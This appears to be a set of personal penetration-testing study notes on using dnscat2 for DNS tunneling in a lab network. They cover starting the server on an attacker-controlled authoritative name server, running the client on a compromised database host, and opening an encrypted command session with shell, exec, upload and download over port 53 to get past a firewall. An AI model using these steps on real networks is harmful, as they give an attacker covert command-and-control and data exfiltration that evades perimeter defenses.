---
aliases:
  - "`dnscat`"
---
# DNS Tunneling w/ `dnscat`
After understanding how to manually do [DNS-tunneling](../../cybersecurity/TTPs/c2/DNS-tunneling.md), we can now automate the process using a tool called [_dnscat2_](https://github.com/iagox86/dnscat2). `dnscat` allows us to *exfiltrate data* using [DNS](../../networking/DNS/DNS.md) queries, specifically [Subdomain](../../networking/DNS/DNS.md#Subdomain) queries. `dnscat` will also allow yo to *infiltrate* data using [`TXT` records](../../networking/DNS/TXT-record.md) (as well as other kinds of DNS records). 
## Example Scenario
Assume we have the same scenario as we did in the [DNS tunneling](DNS-tunneling.md) notes. We've compromised both `FELINEAUTHORITY` (the ANS which sits in the [WAN](../../networking/design-structure/WAN.md) with our attacking machine) as well as `MULTISERVER03` (which straddles the WAN and the [DMZ](../../networking/design-structure/DMZ.md) of the internal network). From `MS03` we've pivoted onto `PGDATABASE01` which straddles the DMZ and a second, more internal [subnet](../../PNPT/PEH/networking/subnetting.md):
![](../oscp-pics/DNS-tunneling-3.png)
On `PGD01`, we don't have any access or ability to make a connection to our external Kali machine so we can't do things like [SSH tunneling](../port-redirection-SSH-tunneling/README.md)/ port forwarding. That's because the [firewall](../../cybersecurity/defense/firewalls.md) sitting between the WAN and DMZ blocks all incoming/ outgoing traffic. This also means we can't do [HTTP tunneling](HTTP-tunneling.md) since there are no open [HTTP](../../www/HTTP.md) ports.

*However*, firewalls usually allow traffic to flow through port `53` since it's reserved for DNS.  Hence, DNS tunneling is within reach.
### Plan
Given this scenario, we can infiltrate data onto `PGD01` by leveraging DNS tunneling techniques. But instead of doing so manually, we can use `dnscat`. To use `dnscat` we'll follow these general steps:
1. set up [`tcpdump`](../../CLI-tools/linux/tcpdump.md) on `FELINE` to capture traffic coming to port `53`
2. start `dnscat` server on `FELINE` 
3. start the `dnscat` client on `PGD01` so it connects back to `feline.corp` (Note that we're leaving out the part where we transfer the `dnscat` binary onto `PGD01` - probably thru our [SSH](../../networking/protocols/SSH.md) connection b/w our attack box and `PGD01`)
4. check for our `dnscat` session back on `FELINE`
5. use the `dnscat` server to interact with the session and use it for infil/exfil of data to and from `PGD01`
## Using `dnscat`
### Basic Configuration
`dnscat` has a server-client design with the server *running on the [Authoritative Name Server](../../networking/DNS/DNS.md#Name%20Servers)* (ANS) and the client *running on the compromised machine*. The client(s) is configured to send queries to a particular domain *within the ANS' namespace*. 

Traffic in the session the two binaries establish is *encrypted by default* meaning even if blue team intercepts the traffic, they won't be able to decrypt them easily. *However*, note that the developer admits they created the algorithm themself and warns *not to trust it 100%*. Additionally, you can mitigate [MITM](../../cybersecurity/TTPs/exploitation/MITM.md) attacks by passing a shared secret (via the `--secret` flag).

To explain how to use `dnscat`, we're going to go through the previously listed steps of our scenario:
### 1. `tcpdump`
First we need to set up `tcpdump` so it captures the data we send to it via queries to [UDP](../../networking/protocols/UDP.md) port `53` on `FELINEAUTHORITY`:
```bash
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```
### 2.  `dnscat` Server
Now we can start `dnscat` in server mode on `FELINE`. The server and the client are going to establish a "session" which uses UDP packets sent between `FELINE` and `PGD01` (via port `53`) to infiltrate/ exfiltrate data. 

Technically, the session will also be transversing `MULTISERVER03` since `PGD01` *doesn't have direct access to external machines* including `FELINE`. Since `FELINE` is the *ANS for the `feline.corp` namespace*, any DNS queries for domains in that namespace *will be forwarded by `MS03` to `FELINE`*.

To start the server version, we use the `dnscat-server` command. We also have to tell it the *namespace* it's going to be acting as the ANS for. 
```bash
kali@felineauthority:~$ dnscat2-server feline.corp

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```
The output tells us that `dnscat` is listening to port `53` *on all interfaces*.
> [!Note]
> We need to *kill any processes* (like `dnsmasq`) on `FELINE` which are handling DNS traffic to the server. Otherwise, two servers will be trying to intercept the same traffic.
#### Other Flags
##### `--secret`
Prevent machine-in-the-middle (MITM) attacks by passing a pre-shared secret which you can validate on the client (has to be passed to both the client and server when you execute).
##### `--security=open`
Disables encryption of the session (which is enabled by default). 
### 3. `dnscat` Client
Back on `PGD01` we need to start the client. Assume the binary is already on there. When we run the binary, we have to *pass it the domain name space* just like we did w/ the server. As long as your server is running on the ANS of the namespace you pass to the client, it should establish the session. 
```bash
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Annoy Mona Spiced Outran Stump Visas 

Session established!
```
#### Other Flags
The `dnscat` [docs][https://github.com/iagox86/dnscat2?tab=readme-ov-file#running-a-server] feature some cool flags:
##### `--ping`
Lets you check if your server is configured correctly 
```
./dnscat --ping feline.corp
```
#####  `--dns`
Give `dnscat` an IP address rather than an namespace (this will cause the server to connect directly to that IP- useful for if you're not on an ANS). You can also pass sub-flags to this flag to specify the server IP, domain, and even the port:
```bash
./dnscat --dns server=8.8.8.8,domain=skullseclabs.org --ping

./dnscat --dns port=53531,server=localhost,domain=skullseclabs.org --ping
```
##### `--no-encryption`
Disable [encryption](../password-attacks/README.md) of the session (which is enabled by default).
### 4. Verify Session
To verify that our `dnscat` session is actually live, we can go back to `FELINE` and check for any new output.
```bash
...
Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas

dnscat2>
```
`New window created: 1` and the output that follows it indicates we *successfully established a session*. The string `Annoy Mona Spiced Outran Stump Visas` also verifies the session's *integrity* since it matches the string outputted *by the client*.
#### `tcpdump`
Lastly, we should see output from our `tcpdump` command and it should be *encrypted*:
```bash
...
07:22:14.732111 IP 192.168.50.64.51077 > 192.168.118.4.domain: 29066+ [1au] TXT? 8f150140b65c73af271ce019c1ede35d28.feline.corp. (75)
07:22:14.732538 IP 192.168.118.4.domain > 192.168.50.64.51077: 29066 1/0/0 TXT "b40d0140b6a895ada18b30ffff0866c42a" (111)
07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME? 38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX? 8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX 385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX? 68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)
07:22:17.407889 IP 192.168.50.64.50621 > 192.168.118.4.domain: 39215+ MX? cd6f0158e082e5562128b71e1353f111be.feline.corp. (64)
07:22:17.408397 IP 192.168.118.4.domain > 192.168.50.64.50621: 39215 1/0/0 MX 985d0158e00880dad6ec05ffff57240ba6.feline.corp. 10 (126)
07:22:17.762124 IP 192.168.50.64.49720 > 192.168.118.4.domain: 51139+ [1au] TXT? 49660140b6509f242f870119c47da533b7.feline.corp. (75)
07:22:17.762610 IP 192.168.118.4.domain > 192.168.50.64.49720: 51139 1/0/0 TXT "8a3d0140b6b05bb6c723aeffff0866c42a" (111)
07:22:18.417721 IP 192.168.50.64.50805 > 192.168.118.4.domain: 57236+ TXT? 3e450158e0e52d9dbf02e91e1492b9d0c5.feline.corp. (64)
07:22:18.418149 IP 192.168.118.4.domain > 192.168.50.64.50805: 57236 1/0/0 TXT "541d0158e09264101bde14ffff57240ba6" (111)
07:22:18.772152 IP 192.168.50.64.50433 > 192.168.118.4.domain: 7172+ [1au] TXT? d34f0140b6d6bd4779cb2419c56ad7d600.feline.corp. (75)
07:22:18.772847 IP 192.168.118.4.domain > 192.168.50.64.50433: 7172 1/0/0 TXT "17880140b6d23c86eaefe7ffff0866c42a" (111)
07:22:19.427556 IP 192.168.50.64.50520 > 192.168.118.4.domain: 53513+ CNAME? 8cd10158e01762c61a056c1e1537228bcc.feline.corp. (64)
07:22:19.428064 IP 192.168.118.4.domain > 192.168.50.64.50520: 53513 1/0/0 CNAME b6e10158e0a682c6c1ca43ffff57240ba6.feline.corp. (124)
07:22:19.782712 IP 192.168.50.64.50186 > 192.168.118.4.domain: 58205+ [1au] TXT? 8d5a0140b66454099e7a8119c648dffe8e.feline.corp. (75)
07:22:19.783146 IP 192.168.118.4.domain > 192.168.50.64.50186: 58205 1/0/0 TXT "2b4c0140b608687c966b10ffff0866c42a" (111)
07:22:20.438134 IP 192.168.50.64.65235 > 192.168.118.4.domain: 52335+ CNAME? b9740158e00bc5bfbe3eb81e16454173b8.feline.corp. (64)
07:22:20.438643 IP 192.168.118.4.domain > 192.168.50.64.65235: 52335 1/0/0 CNAME c0330158e07c85b2dfc880ffff57240ba6.feline.corp. (124)
07:22:20.792283 IP 192.168.50.64.50938 > 192.168.118.4.domain: 958+ [1au] TXT? b2d20140b600440d37090f19c79d9f6918.feline.corp. (75)
...
```
 Notice the [`TXT` records](../../networking/DNS/TXT-record.md) in the output, they are *encrypted strings!* coming into port `53`. Isn't that fun?! There are also [`MX` records](../../networking/DNS/MX-record.md) and [`CNAME` records](../../networking/DNS/CNAME.md) in the output, indicating `dnscat` is using *all three record types* to transport our data from `PGD01` to `FELINE`.

**UNFORTUNATELY** the `tcpdump` output also shows that DNS tunneling with `dnscat` is relatively *loud* since a lot of data is being transferred between the two hosts.
### 5. Use Session
Once the session is established, we'll get a `dnscat` "*command session*" with a command prompt. The UI is made up of windows with the first window being the "main window". There are a lot of commands you can use in the command session:
#### Command Session Commands
##### - `help`/ `?`
Get a list of available commands:
```bash
dnscat2> help

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```
`--help` can also be given to each command so you can see a list of options for each.
##### - `windows`
 Lists all of the current windows:
 ```bash
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
```
This output shows two windows: `main` and `dns1`. `dns1` is the 'listener' or "tunnel driver." To interact with a specific window (like `dns1`) you can use the `-i` flag:
```bash
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (pgdatabase01) 1>
```
From within a specific window, you can also use `?` to get a list of command prefixes:
```bash
command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows
command (pgdatabase01) 1>
```
##### - `sessions`

 

> [!Resources]
> - [_dnscat2_](https://github.com/iagox86/dnscat2)
